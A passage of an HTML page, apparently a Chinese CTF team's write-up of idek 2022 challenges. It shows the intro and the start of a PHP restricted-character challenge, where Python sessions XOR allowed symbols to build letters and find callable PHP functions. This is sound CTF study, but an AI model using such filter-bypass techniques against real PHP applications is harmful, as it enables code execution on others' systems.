@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>idek 2022* MISC &amp;&amp; OSINT &amp;&amp; BlockChain Writeup | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for idek 2022* MISC &amp;&amp; OSINT &amp;&amp; BlockChain Writeup" />
+    <meta property="og:description" content="Writeup for idek 2022* MISC &amp;&amp; OSINT &amp;&amp; BlockChain Writeup" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                前言
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#phpfun">phpfun</a>
+    
+                <a class="dropdown-item" href="#manager-of-the-year-i">manager-of-the-year-i</a>
+    
+                <a class="dropdown-item" href="#manager-of-the-year-2">manager-of-the-year-2</a>
+    
+                <a class="dropdown-item" href="#malbolge-i-gluttony">malbolge-i-gluttony</a>
+    
+                <a class="dropdown-item" href="#malbolge-ii-greed">malbolge-ii-greed</a>
+    
+                <a class="dropdown-item" href="#malbolge-iii-wrath">malbolge-iii-wrath</a>
+    
+                <a class="dropdown-item" href="#malbolge3-revenge">malbolge3-revenge</a>
+    
+                <a class="dropdown-item" href="#niki">niki</a>
+    
+                <a class="dropdown-item" href="#pyjail">pyjail</a>
+    
+                <a class="dropdown-item" href="#pyjail-revenge">pyjail-revenge</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                osint
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#osint-crime-confusion-1-w-as-in-where">osint-crime-confusion-1-w-as-in-where</a>
+    
+                <a class="dropdown-item" href="#osint-crime-confusion-2-w-as-in-weapon">osint-crime-confusion-2-w-as-in-weapon</a>
+    
+                <a class="dropdown-item" href="#osint-crime-confusion-3-w-as-in-who">osint-crime-confusion-3-w-as-in-who</a>
+    
+                <a class="dropdown-item" href="#osint-crime-confusion-4-w-as-in-why">osint-crime-confusion-4-w-as-in-why</a>
+    
+                <a class="dropdown-item" href="#nmpz">nmpz</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                blockchain
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#baby-solana-1">baby-solana-1</a>
+    
+                <a class="dropdown-item" href="#baby-blockchain-2">baby-blockchain-2</a>
+    
+                <a class="dropdown-item" href="#baby-blockchain-3">baby-blockchain-3</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                结语
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">前言</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#phpfun" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">phpfun</span>
+            </a>
+    
+<a href="#manager-of-the-year-i" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">manager-of-the-year-i</span>
+            </a>
+    
+<a href="#manager-of-the-year-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">manager-of-the-year-2</span>
+            </a>
+    
+<a href="#malbolge-i-gluttony" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">malbolge-i-gluttony</span>
+            </a>
+    
+<a href="#malbolge-ii-greed" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">malbolge-ii-greed</span>
+            </a>
+    
+<a href="#malbolge-iii-wrath" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">malbolge-iii-wrath</span>
+            </a>
+    
+<a href="#malbolge3-revenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">malbolge3-revenge</span>
+            </a>
+    
+<a href="#niki" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">niki</span>
+            </a>
+    
+<a href="#pyjail" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pyjail</span>
+            </a>
+    
+<a href="#pyjail-revenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pyjail-revenge</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">osint</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#osint-crime-confusion-1-w-as-in-where" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">osint-crime-confusion-1-w-as-in-where</span>
+            </a>
+    
+<a href="#osint-crime-confusion-2-w-as-in-weapon" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">osint-crime-confusion-2-w-as-in-weapon</span>
+            </a>
+    
+<a href="#osint-crime-confusion-3-w-as-in-who" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">osint-crime-confusion-3-w-as-in-who</span>
+            </a>
+    
+<a href="#osint-crime-confusion-4-w-as-in-why" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">osint-crime-confusion-4-w-as-in-why</span>
+            </a>
+    
+<a href="#nmpz" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">nmpz</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">blockchain</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#baby-solana-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-solana-1</span>
+            </a>
+    
+<a href="#baby-blockchain-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-blockchain-2</span>
+            </a>
+    
+<a href="#baby-blockchain-3" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-blockchain-3</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">结语</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="idek-2022-misc--osint--blockchain-writeup"><a class="header-link" href="#idek-2022-misc--osint--blockchain-writeup"></a>idek 2022* MISC &amp;&amp; OSINT &amp;&amp; BlockChain Writeup</h1>
+<h2 id="前言"><a class="header-link" href="#前言"></a>前言</h2>
+<p>本比赛的Misc,OSINT,Blockchain题目都比较有趣,且本文会比较注重pyjail和OSINT部分,其中在比赛过程中AK了OSINT,Blockchain和MISC各差一题(都比较接近,有些可惜),当然本writeup中将其全部展示.欢迎大家交互,互相学习进步.喜欢玩国际赛的小伙伴欢迎简历<code>root@r3kapig.com</code>加入我们一起玩,我们会及时和你联系</p>
+<p class="img-container"><img src="https://i.imgur.com/Q8OZ5q7.png" alt=""></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc:</h2>
+<h3 id="phpfun"><a class="header-link" href="#phpfun"></a>PHPFu...n:</h3>
+<p>题目限制了只能有以下几个字符</p>
+<pre class="hljs"><code><span class="hljs-comment">([.^])</span><span class="hljs-string">&#x27;,</span></code></pre><p>基本思路就是用现有的字符造更多的字符，但是因为只要一报错就会 <code>die()</code> ，所以不能用包括 <code>[].&#39;&#39;</code> 在内的很多方式，只能从现有的开始：</p>
+<pre class="hljs"><code>In <span class="hljs-selector-attr">[206]</span>: mapping = {}
+     ...: for a, b in <span class="hljs-built_in">combinations</span>(<span class="hljs-string">&#x27;[(,.^)]&#x27;</span>, <span class="hljs-number">2</span>):
+     ...:     x = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ <span class="hljs-built_in">ord</span>(b))
+     ...:     if x in mapping:
+     ...:         continue
+     ...:     mapping[x] = (a, b)
+     ...:
+
+In [<span class="hljs-number">207</span>]: mapping
+Out[<span class="hljs-number">207</span>]:
+{<span class="hljs-string">&#x27;s&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>),
+ <span class="hljs-string">&#x27;w&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>),
+ <span class="hljs-string">&#x27;u&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>),
+ <span class="hljs-string">&#x27;\x05&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>),
+ <span class="hljs-string">&#x27;r&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),
+ <span class="hljs-string">&#x27;\x06&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;\x04&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>),
+ <span class="hljs-string">&#x27;v&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>),
+ <span class="hljs-string">&#x27;\x01&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),
+ <span class="hljs-string">&#x27;\x02&#x27;</span>: (<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>),
+ <span class="hljs-string">&#x27;q&#x27;</span>: (<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;p&#x27;</span>: (<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>),
+ <span class="hljs-string">&#x27;\x07&#x27;</span>: (<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),
+ <span class="hljs-string">&#x27;\x03&#x27;</span>: (<span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;t&#x27;</span>: (<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>)}</code></pre><p>所以现在就有了 <code>([.^])&#39;,swurvqpt</code>然后看到有 <code>str</code> 就想看看有什么能用的字符串相关的函数（<a href="https://www.php.net/manual/zh/ref.strings.php）：">https://www.php.net/manual/zh/ref.strings.php）：</a></p>
+<pre class="hljs"><code><span class="hljs-type">In</span> [<span class="hljs-number">209</span>]: str_funcs = [<span class="hljs-symbol">&#x27;addcslashes&#x27;</span>,<span class="hljs-symbol">&#x27;addslashes&#x27;</span>,<span class="hljs-symbol">&#x27;bin2hex&#x27;</span>,<span class="hljs-symbol">&#x27;chop&#x27;</span>,<span class="hljs-symbol">&#x27;chr&#x27;</span>,<span class="hljs-symbol">&#x27;chunk_</span>​split&#x27;,<span class="hljs-symbol">&#x27;convert_</span>​uudecode&#x27;,<span class="hljs-symbol">&#x27;convert_</span>​ne
+     ...: code&#x27;,<span class="hljs-symbol">&#x27;count_</span>​chars&#x27;,<span class="hljs-symbol">&#x27;crc32&#x27;</span>,<span class="hljs-symbol">&#x27;crypt&#x27;</span>,<span class="hljs-symbol">&#x27;echo&#x27;</span>,<span class="hljs-symbol">&#x27;explode&#x27;</span>,<span class="hljs-symbol">&#x27;fprintf&#x27;</span>,<span class="hljs-symbol">&#x27;get_</span>​html_​translation_​table&#x27;,<span class="hljs-symbol">&#x27;hebrev&#x27;</span>,<span class="hljs-symbol">&#x27;heni</span>
+     ...: <span class="hljs-string">&#x27;,&#x27;</span>html_​entity_​decode&#x27;,<span class="hljs-symbol">&#x27;htmlentities&#x27;</span>,<span class="hljs-symbol">&#x27;htmlspecialchars_</span>​decode&#x27;,<span class="hljs-symbol">&#x27;htmlspecialchars&#x27;</span>,<span class="hljs-symbol">&#x27;implode&#x27;</span>,<span class="hljs-symbol">&#x27;join&#x27;</span>,<span class="hljs-symbol">&#x27;lcfi&#x27;t</span>
+     ...: ,<span class="hljs-symbol">&#x27;levenshtein&#x27;</span>,<span class="hljs-symbol">&#x27;localeconv&#x27;</span>,<span class="hljs-symbol">&#x27;ltrim&#x27;</span>,<span class="hljs-symbol">&#x27;md5_</span>​file&#x27;,<span class="hljs-symbol">&#x27;md5&#x27;</span>,<span class="hljs-symbol">&#x27;metaphone&#x27;</span>,<span class="hljs-symbol">&#x27;money_</span>​format&#x27;,<span class="hljs-symbol">&#x27;nl_</span>​langinfo&#x27;,<span class="hljs-symbol">&#x27;nl2br&#x27;</span>,<span class="hljs-symbol">&#x27;nure</span>
+     ...: _​format&#x27;,<span class="hljs-symbol">&#x27;ord&#x27;</span>,<span class="hljs-symbol">&#x27;parse_</span>​str&#x27;,<span class="hljs-symbol">&#x27;print&#x27;</span>,<span class="hljs-symbol">&#x27;printf&#x27;</span>,<span class="hljs-symbol">&#x27;quoted_</span>​printable_​decode&#x27;,<span class="hljs-symbol">&#x27;quoted_</span>​printable_​encode&#x27;,<span class="hljs-symbol">&#x27;quote&#x27;</span>,
+     ...: rtrim&#x27;,<span class="hljs-symbol">&#x27;setlocale&#x27;</span>,<span class="hljs-symbol">&#x27;sha1_</span>​file&#x27;,<span class="hljs-symbol">&#x27;sha1&#x27;</span>,<span class="hljs-symbol">&#x27;similar_</span>​text&#x27;,<span class="hljs-symbol">&#x27;soundex&#x27;</span>,<span class="hljs-symbol">&#x27;sprintf&#x27;</span>,<span class="hljs-symbol">&#x27;sscanf&#x27;</span>,<span class="hljs-symbol">&#x27;str_</span>​contains&#x27;,<span class="hljs-symbol">&#x27;str_</span>​eniw
+     ...: th&#x27;,<span class="hljs-symbol">&#x27;str_</span>​getcsv&#x27;,<span class="hljs-symbol">&#x27;str_</span>​ireplace&#x27;,<span class="hljs-symbol">&#x27;str_</span>​pad&#x27;,<span class="hljs-symbol">&#x27;str_</span>​repeat&#x27;,<span class="hljs-symbol">&#x27;str_</span>​replace&#x27;,<span class="hljs-symbol">&#x27;str_</span>​rot13&#x27;,<span class="hljs-symbol">&#x27;str_</span>​shuffle&#x27;,<span class="hljs-symbol">&#x27;str_</span>​s&#x27;
+     ...: tr_​starts_​with&#x27;,<span class="hljs-symbol">&#x27;str_</span>​word_​count&#x27;,<span class="hljs-symbol">&#x27;strcasecmp&#x27;</span>,<span class="hljs-symbol">&#x27;strchr&#x27;</span>,<span class="hljs-symbol">&#x27;strcmp&#x27;</span>,<span class="hljs-symbol">&#x27;strcoll&#x27;</span>,<span class="hljs-symbol">&#x27;strcspn&#x27;</span>,<span class="hljs-symbol">&#x27;strip_</span>​tags&#x27;,<span class="hljs-symbol">&#x27;striphs</span>
+     ...: es&#x27;,<span class="hljs-symbol">&#x27;stripos&#x27;</span>,<span class="hljs-symbol">&#x27;stripslashes&#x27;</span>,<span class="hljs-symbol">&#x27;stristr&#x27;</span>,<span class="hljs-symbol">&#x27;strlen&#x27;</span>,<span class="hljs-symbol">&#x27;strnatcasecmp&#x27;</span>,<span class="hljs-symbol">&#x27;strnatcmp&#x27;</span>,<span class="hljs-symbol">&#x27;strncasecmp&#x27;</span>,<span class="hljs-symbol">&#x27;strncmp&#x27;</span>,<span class="hljs-symbol">&#x27;strpbrk&#x27;</span>
+     ...: ,<span class="hljs-symbol">&#x27;strpos&#x27;</span>,<span class="hljs-symbol">&#x27;strrchr&#x27;</span>,<span class="hljs-symbol">&#x27;strrev&#x27;</span>,<span class="hljs-symbol">&#x27;strripos&#x27;</span>,<span class="hljs-symbol">&#x27;strrpos&#x27;</span>,<span class="hljs-symbol">&#x27;strspn&#x27;</span>,<span class="hljs-symbol">&#x27;strstr&#x27;</span>,<span class="hljs-symbol">&#x27;strtok&#x27;</span>,<span class="hljs-symbol">&#x27;strtolower&#x27;</span>,<span class="hljs-symbol">&#x27;strtoupper&#x27;</span>,<span class="hljs-symbol">&#x27;strtr</span>
+     ...: <span class="hljs-string">&#x27;,&#x27;</span>substr_​compare&#x27;,<span class="hljs-symbol">&#x27;substr_</span>​count&#x27;,<span class="hljs-symbol">&#x27;substr_</span>​replace&#x27;,<span class="hljs-symbol">&#x27;substr&#x27;</span>,<span class="hljs-symbol">&#x27;trim&#x27;</span>,<span class="hljs-symbol">&#x27;ucfirst&#x27;</span>,<span class="hljs-symbol">&#x27;ucwords&#x27;</span>,<span class="hljs-symbol">&#x27;utf8_</span>​decode&#x27;,<span class="hljs-symbol">&#x27;utne</span>
+     ...: code&#x27;,<span class="hljs-symbol">&#x27;vfprintf&#x27;</span>,<span class="hljs-symbol">&#x27;vprintf&#x27;</span>,<span class="hljs-symbol">&#x27;vsprintf&#x27;</span>,<span class="hljs-symbol">&#x27;wordwrap&#x27;</span>]
+
+<span class="hljs-type">In</span> [<span class="hljs-number">210</span>]: for func <span class="hljs-keyword">in</span> str_funcs:
+     ...:     <span class="hljs-keyword">if</span> all(c <span class="hljs-keyword">in</span> mapping for c <span class="hljs-keyword">in</span> func):
+     ...:         print(func)
+     ...:
+strstr
+strtr</code></pre><p>然后通过 <code>strstr</code> 就可以拿到 <code>false = strstr(&#39;.&#39;,&#39;,&#39;)</code>，但是还不够，于是就跑去把所有的函数都拿来了（<a href="https://www.php.net/manual/zh/indexes.functions.php）：">https://www.php.net/manual/zh/indexes.functions.php）：</a></p>
+<pre class="hljs"><code>In [<span class="hljs-number">211</span>]: phpfuncs = []
+     ...: with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;/phpfuncs.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:
+     ...:     phpfuncs = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)
+     ...:
+
+In [<span class="hljs-number">212</span>]: <span class="hljs-keyword">for</span> func in phpfunc<span class="hljs-variable">s:</span>
+     ...:     <span class="hljs-keyword">if</span> <span class="hljs-keyword">all</span>(<span class="hljs-keyword">c</span> in mapping <span class="hljs-keyword">for</span> <span class="hljs-keyword">c</span> in func):
+     ...:         <span class="hljs-keyword">print</span>(func)
+     ...:
+<span class="hljs-built_in">sqrt</span>
+strstr
+strtr</code></pre><p>然后通过 <code>sqrt(strstr(&#39;.&#39;,&#39;,&#39;))</code> 拿到了 <code>0</code> ，但是拿到数字之后现在并没有什么用，于是想办法放到之前已经有的字符里面看看还能生成什么字符：</p>
+<pre class="hljs"><code>In <span class="hljs-selector-attr">[215]</span>: mapping = {}
+     ...: for a, b in <span class="hljs-built_in">combinations</span>(<span class="hljs-string">&#x27;[(,.^)]0&#x27;</span>, <span class="hljs-number">2</span>):
+     ...:     x = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ <span class="hljs-built_in">ord</span>(b))
+     ...:     if x in mapping:
+     ...:         continue
+     ...:     mapping[x] = (a, b)
+     ...: mapping
+Out[<span class="hljs-number">215</span>]:
+{<span class="hljs-string">&#x27;s&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>),
+ <span class="hljs-string">&#x27;w&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>),
+ <span class="hljs-string">&#x27;u&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>),
+ <span class="hljs-string">&#x27;\x05&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>),
+ <span class="hljs-string">&#x27;r&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),
+ <span class="hljs-string">&#x27;\x06&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;k&#x27;</span>: (<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),
+ <span class="hljs-string">&#x27;\x04&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>),
+ <span class="hljs-string">&#x27;v&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>),
+ <span class="hljs-string">&#x27;\x01&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),
+ <span class="hljs-string">&#x27;\x18&#x27;</span>: (<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),
+ <span class="hljs-string">&#x27;\x02&#x27;</span>: (<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>),
+ <span class="hljs-string">&#x27;q&#x27;</span>: (<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;\x1c&#x27;</span>: (<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),
+ <span class="hljs-string">&#x27;p&#x27;</span>: (<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>),
+ <span class="hljs-string">&#x27;\x07&#x27;</span>: (<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>),
+ <span class="hljs-string">&#x27;\x1e&#x27;</span>: (<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),
+ <span class="hljs-string">&#x27;\x03&#x27;</span>: (<span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;n&#x27;</span>: (<span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),
+ <span class="hljs-string">&#x27;t&#x27;</span>: (<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>),
+ <span class="hljs-string">&#x27;\x19&#x27;</span>: (<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>),
